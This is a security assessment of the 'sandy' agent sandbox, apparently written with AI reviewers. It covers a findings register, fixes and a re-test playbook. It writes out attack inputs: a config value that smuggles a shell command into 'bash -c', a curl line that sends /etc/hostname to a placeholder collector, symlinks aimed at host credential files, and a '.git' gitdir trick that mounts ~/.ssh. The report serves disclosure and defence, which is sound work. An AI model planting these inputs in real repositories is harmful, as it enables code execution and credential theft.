# Security Posture Assessment — `sandy`

**Target:** `github.com/rappdw/sandy`, working tree at commit `039616d` (`1.10.0-dev`) plus uncommitted changes, assessed as-is.
**Date:** 2026-09-04. **Method:** the four-stage runbook in `REVIEW_RUNBOOK.md`, executed with model diversity — lead review + reconciliation (Claude Fable 5.1), independent outside-attacker challenge (Claude Opus, fresh context, not shown the lead report), and two focused passes (LLM isolation; CI/supply-chain). Validation mode: READ_ONLY. No `sandy`/`docker`/`tmux` was executed against a target; findings are Code-confirmed unless noted.

---

## 0. Status as of 2026-09-16 — read this before the assessment below

**The assessment text is preserved as written on 2026-09-04.** It describes the tree at `1.10.0-dev`. Everything below §1 is the original judgement, not a running commentary, because a review that is quietly edited to match the code it reviewed stops being evidence of anything. This section is the only place that says what has changed since.

**Five of the eleven findings are fixed and shipped.** Four of the six that remain are unchanged; two were re-scoped by what the fixes found.

| | Shipped in | What actually landed |
|---|---|---|
| **R1** | **1.13.1** | `printf %q` at the `bash -c` sink for `SANDY_TEAMMATE_MODE` and `SANDY_CHANNELS`. Guarded by `run-tests.sh §128`. |
| **R2** | **1.13.2** | The `crossSessionInbound` writer refuses any target path with a symlink component below its anchor. `§129`. |
| **R5** | **1.13.3** | Structural `gitdir:` validation, `:ro` on the submodule gitdir's `config`/`hooks`/`info`, and symlinked protected paths routed through the symlink approval wherever they point. `§130`. |
| **R7b** | **1.13.4** | The Telegram host relay refuses to start without `TELEGRAM_ALLOWED_SENDERS`, and `_is_allowed` fails closed. The README's incorrect "pairing mode" claim is corrected. `§131`. |
| **R7a** | **1.14.0** | `SANDY_SSH_KEYS` — a default-empty allowlist of files under `~/.ssh`; nothing private is staged unless named. `§132`. |

**Still open:** R3 (credential blast radius — the durable fix is the #121 broker), R4 (unsigned release/upgrade chain), R6 (passive keys that widen credential exposure or trigger host builds), R8 (`.sandy/Dockerfile` gate bypass), R9 (proxy availability), R10 (install/upgrade verification), R11 (lower-severity integrity gaps).

### Where the review was wrong, and in which direction

Recorded because it bears on how much weight to give the unfixed findings.

- **R5 was understated.** The write-up described symlinked protected paths. It did not find that a `.git` **file** — repository content — had its `gitdir:` resolved with a bare `cd`, no containment check, and bind-mounted with **no `:ro`**, nor that a *legitimate* submodule worktree was equally unprotected. Both were found by measuring the emitted mount flags rather than reading the code.
- **R7a was badly understated.** "Copies host private keys" turned out to be **57 files, 35 of them private keys**, including the operator's employer credentials and six AWS `.pem` files, in a container working on an unrelated repository. The review had no way to know this: it is a property of one operator's `~/.ssh`, not of the source.
- **R7's docs half was the more serious half.** The README told users that omitting the Telegram allowlist gave "pairing mode". That is true of the in-container plugin and false of the host relay, so people left the allowlist unset *on the documentation's word*. The doc was load-bearing for the exposure, not incidental to it.
- **One flagged unknown is now settled.** §2(a) — whether Docker Desktop on macOS dereferences a symlinked `-v` source — **it does**, measured. R5 is a live macOS exposure, not a Linux-only one.
- **A defect was found that the review did not contain**, while chasing R7a: the macOS SSH agent relay dies with its launching process, so `SANDY_SSH=agent` silently degrades to pure key-copying on any re-attached daemon session. Filed as **#288**.

### What the fixing process taught, which the review could not

Four design decisions came from verifying the fixes against a real workspace rather than from review, and each **changed** the design rather than confirming it:

1. **Default-deny beats a content sniff.** The first R7a design skipped files whose first line matched `-----BEGIN … PRIVATE KEY-----`. A `gitCredentials.csv` in the affected `~/.ssh` is credential-shaped with no `BEGIN` line and would have been staged. A blocklist can only reject what its author anticipated.
2. **Filtering the copy is not filtering the mount.** The first R7a implementation filtered what the entrypoint copied into `~/.ssh`. Nothing unmounts `/tmp/host-ssh`, the container runs as the host uid, and the files are `600` owned by it — so every key would have stayed readable at the mount. The exposure is the mount.
3. **A control whose misconfiguration is indistinguishable from success is not a control.** An allowlist entry naming a file that does not exist now warns. Without it, a typo produces exactly the output of a correctly-configured system.
4. **The test suite could not have caught most of this.** The decisive evidence came from two-hop SSH through a NAS to a DMZ, `scp -O` to a Synology, and cloud-init `.pub` reads — none of which any unit test reaches.

### The register tracks vulnerabilities; §3 names the threats — and only the register was maintained

Added 2026-09-17, from `research/defending-code-reference-harness/docs/threat-model.md` (at `d3bea6b`), which draws the distinction this document blurs:

> A **threat** is a property of the system's architecture and exposure... A **vulnerability** is one concrete instance... Fix that line and the vulnerability is gone, but the threat still stands — the parser still ingests untrusted bytes, and the next bug in it has the same consequence.

This review is a **vulnerability register**. R1–R11 are eleven concrete instances, each with a file and a line, each closable by a patch. §3 already names the **threats** — and then nothing tracked them. The table at the top of this section can reach eleven-of-eleven green while every threat in §3 is still live.

That is not hypothetical here; it is what the fixing process did:

| Threat (§3) | Instances found, in order |
|---|---|
| (1) values are never validated, only key names | **R1** (`bash -c` injection via two passive keys) — and `SANDY_MODEL`/`SANDY_EFFORT` are safe only by a *different* mechanism, which is why the rule had to become "quote at the sink" rather than "validate these keys" |
| (2) trust decisions test path existence, which follows symlinks | **R2** (settings writer), **R5** (protected paths), **R5 again** (the `gitdir:` line — repository content, resolved with a bare `cd`, mounted **rw**), and arguably **R7a** (the `~/.ssh` mount, where the exposure was the mount rather than the copy) |

Four of the five shipped fixes are instances of threat (2). They were discovered **serially, across four releases**, each one by measuring a surface nobody had measured before — never by the review predicting the next instance from the threat it had already written down. R5's own entry above says so: *"Both were found by measuring the emitted mount flags rather than reading the code."*

**What this changes going forward.** The threats in §3 outlive their instances, so they are the durable artefact and the register is the perishable one. Two consequences worth holding to:

1. **A green register is not a closed threat.** When R6 and R8 close, threat (1) is still live for every future interpolation into a command string, and threat (2) for every future `[ -e ]`/`[ -d ]` gate. Neither is retired by a patch; both are retired only by a rule applied at the class — which is what `printf %q` at the sink and `_sandy_path_symlink_component` actually are.
2. **The clean-room re-run below should re-derive the threats, not re-test the findings.** Re-checking R1–R11 confirms eleven patches. Enumerating every place sandy makes a trust decision on a name, a path, or an unvalidated value is the search that would have found R5's `gitdir:` case before a review missed it twice.

This is a framing correction, not a new finding. No R-number changes, and nothing above or below is restated.

### The recommended clean-room re-run has NOT happened

§8 recommends a fresh-context re-run before any public disclosure. That has not been done. What has been done is targeted verification of each fix, which is a different and narrower thing: it confirms the named findings are closed; it does not re-examine the surfaces nobody looked at the first time.

---

## 1. Executive posture and recommendation

**The container boundary is genuinely well built. The trust boundary around credentials is not.** Sandy's Docker hardening is strong and holds up to adversarial reading: `--cap-drop ALL` (five caps re-added for the root phase only), `no-new-privileges`, read-only rootfs, no docker socket, no `--privileged`/host namespaces, and an `--internal` sidecar whose egress proxy fails closed, never forwards DNS upstream, and drops non-TCP by topology. No reviewer found a container escape.

The risk is entirely on the other side of that boundary: **sandy treats the workspace repository as trusted, and places durable, broadly-scoped credentials inside the box with the agent de-gated to `bypassPermissions`.** Four independent analyses converged on one root cause — *sandy makes trust decisions on names and paths without validating the values or resolving the indirections behind them* — and produced two Critical chains that need no prompt injection and no human approval, plus a Critical chain in code added last session.

**Recommendation, by use:**

| Use | Verdict |
|---|---|
| Trusted repositories, default config | **Acceptable.** The hardening is real and the documented residuals are honest. |
| Untrusted / third-party / PR-review repositories, default config | *(2026-09-16: R1, R2 and R5 are fixed; the three deterministic no-injection chains are closed. R3 is not, so a single in-container execution by any remaining route still reaches every credential in the box. Re-read this row as **materially improved, still gated on R3**.)* **Not acceptable until R1 and R2 are fixed.** A repository the developer merely opens gets deterministic code execution and host-credential harvest, no injection, no prompt. This is the stated purpose of the tool ("an isolated sibling… the workspace may be hostile"), so this is a gap against the product's own threat model, not an out-of-scope misuse. |
| CI / fleet (`--start`, `-p`) | **Conditional.** The injection chains fire on the headless and daemon paths too, unattended. |

**The single highest-value fix**, on which the lead and the independent challenge agreed independently: **validate passive config values, not just key names** — two `printf '%q'` calls close R1 outright, and the same "check the value/indirection, not the name" principle closes R2 and R5. See §5.

**A disclosure that matters for how you weight this report:** the lead reviewer implemented parts of the code under review in the immediately preceding session (the cross-session-inbound feature, the handoff relay, the codex-auth change). The independent Opus challenge — run in a fresh context and deliberately not shown the lead's report — found a **Critical** flaw (R2) *in that cross-session-inbound code* that the lead's own Stage 1 missed. Treat that as the strongest available evidence both that the multi-model methodology earned its cost and that self-review of one's own recent code is unreliable.

---

## 2. Scope, environment, and limits (stated first because they are material)

- **The assessment environment violated the runbook's own preconditions.** The review ran inside a live sandy container on the maintainer's machine with the maintainer's credentials mounted (`cred_mode: oauth-token`, `bypassPermissions`, `permissive` egress), and the target's `CLAUDE.md` auto-loaded as instructions. Mitigations: all docs treated as untrusted claims and re-verified against `sandy`/`proxy`/`install.sh`/`.github`; every finding cites `file:line`; the challenge stage ran in an isolated context. A clean-room re-run on a disposable VM with synthetic credentials would raise confidence on the two items marked untested below and is recommended before any public disclosure.
- **Nothing was executed against a target.** Ratings are Code-confirmed; two are additionally supported by standalone harnesses (R1's `bash -c` mechanism; the proxy sub-analyses) that touched no repository files and ran no docker.
- **Two facts were untested and flagged in-line:** (a) whether Docker dereferences a symlinked `-v` source on macOS Docker Desktop's file-sharing layer (R5 — standard behavior on Linux; one command settles it, §7). **SETTLED 2026-09-15: it does.** Measured on the maintainer's host; see §7 R5; (b) whether Claude Code itself auto-executes a project-settings `hooks` block under the trust dialog sandy pre-accepts (relevant only to a weaker variant of R1 that R1's stronger evidence makes moot).

---

## 3. Systemic root cause

Every risky default is justified in the code by one sentence — *the container is the isolation boundary* — and that sentence is **true for the host and false for the credentials, which live inside the boundary.** Three specific expressions of it:

1. **Config tiers are enforced on key names; values are never validated** (`sandy:7113-7116`, `export "$key=$value"`). The `pattern` column that looks like validation feeds `--print-schema` only. → R1, R6.
2. **Trust and mount decisions test path *existence* (`[ -e ]`/`[ -d ]`), which follows symlinks, without `[ -L ]` or a `pwd -P` containment check** — the exact anti-pattern the project warns itself against at `SPECIFICATION.md:810`. The one guard that does resolve indirection (`_sandy_resolve_symlinks`) sits on a code path the mount loops and the settings-writer never call, and runs too late. → R2, R5.
3. **The threat model names a "committed-config attacker" but scoped its controls to `.sandy/config` isolation-keys and git's hook vectors** — never the agents' own config surfaces or the launch-command construction, which sandy actively de-gates (pre-accepted trust dialog, `bypassPermissions`, unvalidated passive values). → R1, R3.

---

## 4. Reconciled risk register

Impact, likelihood, and confidence are separate. Likelihood is for an unattended default installation over time, not per launch. "Validation" uses the runbook's ladder: **Code-confirmed** = complete source chain read; **+harness** = mechanism reproduced in a standalone rig; **+live** = observed in the running review container; **Conditional** = one untested fact gates it.

| ID | Finding (merged root cause) | Impact | Likelihood | Conf. | Validation | Priority |
|---|---|---|---|---|---|---|
| **R1** | Untrusted repo → **deterministic in-container command execution** at launch, no approval, no injection: passive `SANDY_TEAMMATE_MODE` / `SANDY_CHANNELS` values are unvalidated and reach `bash -c` unquoted | Critical | High | High | Code-confirmed **+harness** | **P0** |
| **R2** | Committed **symlink** at `.claude/settings.local.json` → sandy's `crossSessionInbound` writer follows it, copies arbitrary host JSON credentials into the rw workspace, and **replaces the symlink before the symlink scan runs** | Critical | High | High | Code-confirmed | **P0** |
| **R3** | Any in-container execution reaches **all credentials**: `GIT_TOKEN` + `GH_ACCOUNTS` (every gh account's token) + Claude **refresh token**, container-level env, **permissive egress by default** | Critical (chain) | High | High | Code-confirmed **+live** | **P0** (surface reduction) |
| **R4** | If the victim is the **maintainer**, R3's token pushes to `main` (ruleset requires status checks the PR controls, **no review, no signatures**) → `install.sh`/`--upgrade` fetch **unverified `main`** → RCE on every install; proxy rebuilt monthly from a mutable ref | Critical | Low | High | Code-confirmed + GitHub API | **P0/P1** |
| **R5** | Committed **symlink** at any protected-path name, and the **submodule gitdir** (`.git` file), are mounted following symlinks with no `[ -L ]`/containment; gitdir is mounted **rw** | High | Medium | Med-High | Code-confirmed (docker-deref on macOS untested) | **P1** |
| **R6** | Passive keys **widen credential exposure / trigger unapproved host builds**: `SANDY_SKILL_PACKS` root-builds a third party's default-branch HEAD; `SANDY_AGENT` summons every provider credential; Vertex-routing keys redirect a credentialed session | High | Medium | High | Code-confirmed | **P1** |
| **R7** | `SANDY_SSH=agent` **copies host private keys** into the agent-readable `~/.ssh` (docs say "socket mount"); the **Telegram host relay fails open** on an empty allowlist (README says "pairing") | High (where enabled) | Low-Med | High | Code-confirmed | **P1** |
| **R8** | `.sandy/Dockerfile` gate is **bypassed by `SANDY_AUTO_APPROVE_PRIVILEGED=1`** (env-only, but the suites export it globally and it is undocumented for this gate); review shows only 200 lines; `.secrets` stays in the build context but is hidden from the reviewer | High | Low | High | Code-confirmed | **P1/P2** |
| **R9** | Egress-proxy **availability & anti-forensics**: one CONNECT with unbounded headers OOMs the 256 MB proxy (`--restart on-failure:5` → 5 conns strand the session); a global 512-slot semaphore taken before `Accept` wedges every listener; SNI deny-log is forgeable and unrotated | Medium | Medium | Med (proxy sub-analysis; not re-executed by lead) | Code-confirmed | **P2** |
| **R10** | Install/upgrade and image build chain **unverified**: `--upgrade` installs `main` with no checksum/signature/downgrade guard; seven `curl \| sh` installers; Go tarball with an available-but-unused sha256; floating `npm -g` with scripts; no `DOCKER_CONTENT_TRUST`; unsigned tags | Medium-High | Low | High | Code-confirmed + public API | **P2** |
| **R11** | Lower-severity integrity gaps: **forgeable `sandy-session.json`** (missing `_json_escape`); symlink-scan `$HOME` false-negative when `$HOME` has a symlink component; credential temp dirs **leak on SIGKILL**; OSC-passthrough + `set-clipboard on`; multiple **doc-vs-code contradictions** (see §6) | Low-Med | Low-Med | High | Code-confirmed (+live for the $HOME repro) | **P2 / backlog** |

**Merged away as duplicates of the above root causes:** the lead's F1/Chain-B ("committed `.claude/settings.json` hooks/env honored") folds into **R1** — it is the same "repo → in-container execution" finding, and R1's `bash -c` command-injection evidence is strictly stronger and removes F1's one Medium-confidence dependency (whether Claude Code silently runs project hooks). The documented residual **R3 in `THREAT_MODEL.md`** is retained but materially re-rated: it named "a GitHub token," not all accounts plus the refresh token, and assumed a prompt-injected agent, not a deterministic no-cooperation trigger.

---

## 5. The two P0 chains, in detail

### R1 — passive config value → `bash -c` command injection (no injection, no approval)

Complete chain, every hop code-verified; the mechanism was reproduced in a standalone harness (no repo files, no docker):

1. Attacker ships `.sandy/config` with `SANDY_TEAMMATE_MODE='x; <arbitrary shell>'`. Write access to an upstream is not required — `gh pr checkout N && sandy`, the review workflow, suffices. It reads as ordinary dev-container config.
2. `SANDY_TEAMMATE_MODE` is passive (`sandy:72`) and absent from the value-aware gate (`sandy:141-152`) → **no approval prompt**. `SANDY_EFFORT`, by contrast, *is* enum-validated (`sandy:11465-11467`) — so it is safe, and teammate-mode is the unguarded key. `SANDY_CHANNELS` (`sandy:78`, interpolated at `:5651`) is the second injection site.
3. Exported unvalidated (`sandy:7115`), forwarded (`sandy:11499`), and concatenated **unquoted** into the agent command: `cmd+=" --teammate-mode ${_tm}"` (`sandy:5618`).
4. The string is captured literally by `$( )` (`sandy:5923`) and executed by `exec bash -c "$AGENT_CMD"` — on the **headless** path (`sandy:5925`), the **daemon** path (`sandy:5934`), and the multi-agent panes (`sandy:5969+`). Because it is `bash -c` of one unquoted concatenated string (not an argv array, not `tmux send-keys`), the metacharacters execute. The CLI-argument path is *not* vulnerable — it runs args through `printf '%q'`; these two interpolations bypass that one quoting call.
5. The executed shell reads `GIT_TOKEN`/`GH_ACCOUNTS`/refresh token from its own environment (R3) and exfiltrates under permissive egress — **before the agent's first turn, invisible to `SANDY_TOOL_AUDIT`** (which instruments only Claude Code tool calls).

**Fix:** `printf '%q'` on `${_tm}` (`sandy:5617`) and `${_ch_specs}` (`sandy:5651`). Two lines. Broader: validate passive values at load, or run every forwarded value through `%q`.

### R2 — committed symlink harvests host credentials, defeating the symlink guard by ordering

1. With claude selected (default), sandy writes `crossSessionInbound` into `$WORK_DIR/.claude/settings.local.json` **on every launch, unconditionally** — even when the key is unset and resolves to `refuse` (`sandy:9555`).
2. `_sandy_csi_write` does `JSON.parse(fs.readFileSync(f,"utf8"))` — **follows a symlink** at that path and reads the target — then `JSON.stringify`s the whole object, preserving every key (`sandy:9493-9500`).
3. `mv -f "$_t" "$_f"` **replaces the symlink with a regular file** in the rw workspace (`sandy:9530`).
4. `_sandy_resolve_symlinks` — the dangerous-symlink prompt — does not run until `sandy:11155`, long after step 3. The artifact it scans for is already gone, so it never prompts and never records it, even for a `$HOME` target it otherwise would have refused.
5. A committed `.claude/settings.local.json` symlinked to `~/.config/gcloud/application_default_credentials.json`, `~/.aws/sso/cache/*.json`, `~/.docker/config.json`, `~/.codex/auth.json`, `~/.gemini/oauth_creds.json`, `~/.claude/.credentials.json`, or `~/.claude.json` (all JSON objects) has its contents copied into the workspace as a plain file — exactly the credentials the container mount set deliberately does *not* forward — then read and exfiltrated by R1 or by the agent under defaults. A non-object target fails safe (`process.exit(3)`, no write).

**Fix:** skip the write when the target is a symlink (`[ -L ]`), or run the workspace write *after* `_sandy_resolve_symlinks`, or gate it on the key being explicitly set. This is the finding to fix first — it is Critical, default-on for the default agent, and it destroys its own evidence.

---

## 6. Documentation-vs-code contradictions (each is a finding)

The runbook treats docs as claims. `CLAUDE.md` is loaded into every agent session as operating truth, so drift here is operational, not cosmetic:

1. `CLAUDE.md` "Per-project Configuration": *"not sourced — no shell execution, validated against an allowlist."* → The file is not `source`d, but two passive **values** reach `bash -c` (R1); validation is name-only.
2. `CLAUDE.md`/`README` describe `SANDY_SSH=agent` as socket forwarding. → The entrypoint **copies the host's private key files** into the container (`sandy:4788-4800`, `-v $HOME/.ssh:/tmp/host-ssh` at `:11810`). `SPECIFICATION.md:888` does document the copy; `CLAUDE.md`/`README` contradict it by omission.
3. `README:714`: omitting the Telegram allowlist gives "pairing" mode. → True only of the in-container plugin; the **host relay fails open** (`sandy:6071-6076`, R7).
4. `CLAUDE.md`: "every per-connection goroutine is wrapped in a panic-recovering `guard()`." → `proxy/splice.go` spawns unguarded goroutines; the DNS path is unguarded (Stage 2 proxy sub-analysis).
5. `CLAUDE.md`: `SANDY_LOCAL_LLM_HOST` reaches that LAN host. → `proxy/forward.go` targets `host.docker.internal` regardless (sub-analysis).
6. `.github/dependabot.yml`: comments claim action SHAs are pinned. → Everything is `actions/*@vN` mutable tags plus `govulncheck@latest`.
7. `--upgrade` help/`cli_flags`: "latest **release**." → It fetches `main` HEAD (R10). Also `CLAUDE.md`'s claim that rc users are not nagged toward the same-numbered final is contradicted by `_ver_should_update` (`sandy:360-374`), which exists to do exactly that.

---

## 7. Remediation roadmap

**P0 — before any untrusted-repo or fleet use.**
- **R1: FIXED in 1.13.1.** Both sinks go through `printf %q`; the rule adopted is the class rather than the two lines — any value interpolated into an agent command string is quoted, because the sink is `bash -c`, not an argv array. `§128` asserts the property (build the command, run it, check nothing executed) rather than the presence of a `%q` call. Original recommendation retained: `printf '%q'` on `sandy:5617` and `:5651`; add value validation to the passive-config loader so a value with shell metacharacters is refused or approval-gated. Add a `run-tests.sh` case that plants `SANDY_TEAMMATE_MODE='x;touch /tmp/pwn'` and asserts no execution.
- **R2: FIXED in 1.13.2**, and neither suggested fix was taken. Skipping silently leaves the agent able to write *through* the link; reordering does not stop the read. Sandy **refuses** the write when any path component below the anchor is a symlink, which also leaves the link intact for the symlink approval to surface — `mv -f` had been destroying the evidence its own approval gate keys on. Original recommendation retained: guard `_sandy_csi_write` with `[ -L "$target" ]` → skip + warn; or reorder the workspace write after `_sandy_resolve_symlinks`. Add a case that symlinks the settings file at a host path and asserts the target is not read and the symlink survives.
- **R3:** default untrusted repositories to `SANDY_EGRESS_STRICT=1` (an "unrecognized workspace" is the trigger sandy already computes for its approval prompt); mint a workspace-scoped GitHub token instead of forwarding `gh auth token`/`GH_ACCOUNTS`; do not forward `admin:public_key`/`gist` scope. Warn loudly on excess `gh` scopes. The durable fix is the #121 credential broker — the only one that survives the next config surface an agent vendor adds.
- **R4:** require review **and** `required_signatures` on the `main` ruleset; sign releases (checksums + sigstore) and make `install.sh`/`--upgrade` verify before replacing the binary; pin the proxy image to a commit/tag with `git verify-tag`.

**P1.**
- **R5: FIXED in 1.13.3.** Verified worse than written before being fixed. (a) The `gitdir:` line in a `.git` FILE was resolved with a bare `cd`, no containment check, and mounted with **no `:ro`** — `gitdir: ../../.ssh` gave `-v $HOME/.ssh:/home/claude/.ssh` **read-write**, i.e. host code execution via an ssh `ProxyCommand`, and invisible to the symlink scan because `.git` is a regular file. (b) A **legitimate** submodule worktree was equally unprotected: measured, the gitdir produced exactly one mount flag, read-write, with no `:ro` over `config` or `hooks/`. (c) The three mount loops follow symlinks and Docker dereferences the source. Fixes: a **structural** gitdir gate (`HEAD` + `objects/` + `refs/`, chosen over a path prefix because legitimate gitdirs sit outside `$WORK_DIR`), `:ro` overlays on `$GITDIR_HOST/{config,hooks,info}`, and a symlinked protected path routed through the existing symlink approval wherever it points. Guarded by `run-tests.sh §130`, four mutations verified.

  **Carried into R5 from the R2 fix (1.13.2) — do not drop when scoping R5:**

  1. **`.claude/settings.local.json` is now a live R5 instance where it previously was not.** Before 1.13.2 the `crossSessionInbound` writer destroyed a committed symlink at that path (`mv -f`) on essentially every claude launch, so the protected-file mount loop rarely saw one. The R2 fix deliberately **leaves the link in place** — that is the point of refusing rather than resolving — so R5's mount loop is now the next thing that touches it. R2 did not create the R5 exposure, but it did make the path reachable in the common case, and the two fixes must be scoped together rather than a release apart.
  2. **The symlink approval is not a compensating control for R5 on out-of-`$HOME` targets.** `_sandy_resolve_symlinks` `continue`s on any target not under `$HOME` (it only mounts targets it can safely map into the container), so a link to `/etc/...` or any absolute path outside the home tree is never added to `DANGEROUS_SYMLINKS` and never prompts — while the protected-path mount loop would still bind it. Any R5 fix must stand on its own `[ -L ]`/containment check and must not assume the approval has already seen the link.
  3. **The reusable predicate already exists.** 1.13.2 added `_sandy_path_symlink_component <anchor> <path>` (bash builtins only, bash-3.2/BSD-clean) and `run-tests.sh §129` exercises it directly at intermediate and final components. R5 should reuse it rather than growing a second, drifting notion of "is this path safe to mount" — the `_sandy_reap_orphan_networks` / `_sandy_handoff_classify` rule.
  4. **SETTLED 2026-09-15 — it dereferences.** `ln -s /etc /tmp/x && docker run --rm -v /tmp/x:/m:ro alpine ls /m` on the maintainer's macOS host listed `/etc`'s contents. R5 is therefore a **live macOS exposure**, not a Linux-only one, and the review's only flagged unknown (§2 item (a), §8 step 3) is closed. Severity stands as written.
- **R6:** move `SANDY_SKILL_PACKS` to value-aware-privileged and pin+verify the pack SHA (drop `|| bun install`); gate `SANDY_AGENT` values that add agents beyond the host default, and any Vertex-routing key, through the approval prompt.
- **R7b: FIXED in 1.13.4.** The Telegram host relay now refuses to start without `TELEGRAM_ALLOWED_SENDERS`, and `_is_allowed` fails closed as a second layer. README:821's pairing claim — which is true of the in-container plugin and false of the host relay — is corrected, because a user who omitted the allowlist did so on the documentation's word. Guarded by `run-tests.sh §131`, four mutations verified.
- **R7a: FIXED in 1.14.0.** `SANDY_SSH_KEYS` (privileged, default empty) allowlists filenames under `~/.ssh`; a host-side ephemeral staged dir is mounted instead of `~/.ssh` itself. Two near-misses are recorded in the code and pinned by `run-tests.sh §132`: filtering only the entrypoint *copy* fixes nothing (nothing unmounts `/tmp/host-ssh`, the container runs as the host uid, so the mount is the exposure), and a content-sniff blocklist waves `gitCredentials.csv` through. Seven mutations verified, including the rejected content-sniff design, which fails on exactly the `gitCredentials.csv` assertion. Field data and both design arguments came from the affected workspace's own session.
- **R8:** document that `SANDY_AUTO_APPROVE_PRIVILEGED` bypasses the Dockerfile gate; hash and display the full context including `.secrets`, or build with `--network=none`.

**P2 / backlog.** R9 (proxy header/read limits and log rotation; forgery-resistant egress summary), R10 (image supply-chain verification, `DOCKER_CONTENT_TRUST`), R11 (`_json_escape` the session marker; canonicalize `$HOME` in the symlink scan; the doc contradictions in §6).

**Human vs automation split (per the runbook):** R1/R2/R5 fixes are release-blocking regression tests — automate. Severity and blast-radius calls (done here) and the R3 credential-model decision are human security-owner calls. The R4 ruleset change is a one-time human action.

---

## 8. Validation playbook (for the recommended clean-room re-run)

On a disposable VM with **synthetic** `GIT_TOKEN`/OAuth canaries and an assessment-owned collector:
1. **R1:** repo with `.sandy/config` → `SANDY_TEAMMATE_MODE='x; curl -T /etc/hostname https://<collector>'`; launch `sandy -p "hi"`; assert the canary arrives before any agent turn. **R1 is Verified** if it does.
2. **R2:** repo with `.claude/settings.local.json` symlinked to a synthetic JSON credential under `$HOME`; launch; assert the synthetic secret appears as a regular file in the workspace and the symlink prompt never listed it.
3. **R5 (settles the macOS unknown):** `ln -s /etc /tmp/x && docker run --rm -v /tmp/x:/m:ro alpine ls /m` on the target host; a listing confirms symlinked-`-v` dereference.
4. **R3:** confirm `GIT_TOKEN`/`GH_ACCOUNTS`/refresh token are present in a container process's environment and reach the collector under permissive egress; confirm `SANDY_EGRESS_STRICT=1` blocks the arbitrary-host leg but not `github.com`.

After validation, destroy the environment and confirm the production network received no canary traffic.

---

## 9. What is genuinely strong (so the register is read in proportion)

The container hardening (no escape found); the egress proxy's design (fail-closed allowlist, no upstream DNS forwarding, non-TCP dropped by topology, sound allowlist matching, immutable-from-agent config, clean bounds-checked wire parsers); credential **ephemerality** and the honest `cred_mode` marker; secrets delivered via `--env-file` rather than argv; the CI trust model (no `pull_request_target`, no secrets to fork PRs, exact-ref-pinned WIF); the `.sandy/Dockerfile` approval gate (content-hashed, fail-closed); and a test suite that is property-based and mutation-tested with an honest residual register. The boundary is well made. The work is to stop trusting the repository inside it.
